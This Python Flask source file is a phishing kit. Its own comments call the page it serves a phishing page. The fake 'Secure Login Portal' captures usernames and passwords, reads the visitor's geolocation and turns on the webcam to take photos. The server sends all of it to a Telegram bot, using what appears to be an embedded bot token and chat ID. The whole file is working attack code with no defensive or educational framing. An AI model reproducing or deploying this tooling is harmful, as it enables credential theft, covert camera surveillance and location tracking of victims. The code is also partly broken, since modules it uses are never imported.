import os
import json
from flask import Flask, request, render_template_string, jsonify
import requests
import geocoder

app = Flask(__name__)

# Configuration
TELEGRAM_TOKEN = os.environ.get("8761461166:AAGJSUvTctDDs0j7kKCIC-gY-7cc2WMnYvM")
CHAT_ID = os.environ.get("6866229974")

# HTML template for phishing page
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Login Portal</title>
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <div class="container">
        <h1>Secure Login Portal</h1>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        
        <div class="camera-section" style="display:none;">
            <video id="video" width="300" height="200"></video>
            <canvas id="canvas" style="display:none;"></canvas>
            <button id="captureBtn">Capture Photo</button>
            <img id="preview" src="" alt="Preview">
            <p id="locationInfo"></p>
        </div>
        
        <div id="result" style="display:none;"></div>
    </div>
    
    <script>
        // Location detection
        function getLocation() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(resolve, reject);
                } else {
                    reject(new Error("Geolocation is not supported"));
                }
            });
        }
        
        // Camera setup
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        
        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                // Location detection
                const pos = await getLocation();
                const locInfo = `Location: ${pos.coords.latitude}, ${pos.coords.longitude}`;
                document.getElementById('locationInfo').textContent = locInfo;
                
                // Store location in hidden field
                const hiddenInput = document.createElement('input');
                hiddenInput.type = 'hidden';
                hiddenInput.name = 'location';
                hiddenInput.value = `${pos.coords.latitude},${pos.coords.longitude}`;
                document.getElementById('loginForm').appendChild(hiddenInput);
                
            } catch (err) {
                console.error("Camera/location error:", err);
                document.getElementById('locationInfo').textContent = "Location unavailable";
            }
        }
        
        document.getElementById('captureBtn').addEventListener('click', () => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            const dataUrl = canvas.toDataURL('image/jpeg');
            document.getElementById('preview').src = dataUrl;
            
            // Send photo to server
            fetch('/upload_photo', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({data: dataUrl})
            }).then(response => response.json())
              .then(data => {
                  document.getElementById('result').innerHTML = '<h2>Success!</h2>';
                  document.getElementById('result').style.display = 'block';
              });
        });
        
        // Form submission
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(e.target);
            const data = Object.fromEntries(formData.entries());
            
            // Submit credentials and location
            await fetch('/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            
            // Show camera after login
            document.querySelector('.container').innerHTML = `
                <h1>Processing...</h1>
                <div class="camera-section">
                    <video id="video" width="300" height="200"></video>
                    <canvas id="canvas" style="display:none;"></canvas>
                    <button id="captureBtn">Capture Photo</button>
                    <img id="preview" src="" alt="Preview">
                    <p id="locationInfo"></p>
                </div>
            `;
            
            // Reinitialize camera
            await initCamera();
            document.getElementById('captureBtn').addEventListener('click', () => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);
                const dataUrl = canvas.toDataURL('image/jpeg');
                document.getElementById('preview').src = dataUrl;
                
                fetch('/upload_photo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({data: dataUrl})
                }).then(response => response.json())
                  .then(data => {
                      document.getElementById('result').innerHTML = '<h2>Success!</h2>';
                      document.getElementById('result').style.display = 'block';
                  });
            });
        });
        
        // Initialize camera on load
        window.addEventListener('load', initCamera);
    </script>
</body>
</html>
'''

def send_to_telegram(message, photo_data=None):
    """Send data to Telegram"""
    url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
    payload = {'chat_id': CHAT_ID, 'text': message}
    
    try:
        response = requests.post(url, data=payload)
        if response.status_code != 200:
            print(f"Telegram API error: {response.text}")
            
        # Send photo if provided
        if photo_data:
            url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto'
            photo_bytes = base64.b64decode(photo_data.split(',')[1])
            files = {'photo': ('photo.jpg', io.BytesIO(photo_bytes))}
            payload = {'chat_id': CHAT_ID}
            requests.post(url, files=files, data=payload)
            
    except Exception as e:
        print(f"Error sending to Telegram: {e}")

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    message = f"Credentials:\nUsername: {data['username']}\nPassword: {data['password']}\nLocation: {data.get('location', 'N/A')}"
    send_to_telegram(message)
    return jsonify({"status": "success"})

@app.route('/upload_photo', methods=['POST'])
def upload_photo():
    data = request.json
    send_to_telegram("Photo captured", data['data'])
    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 80)))
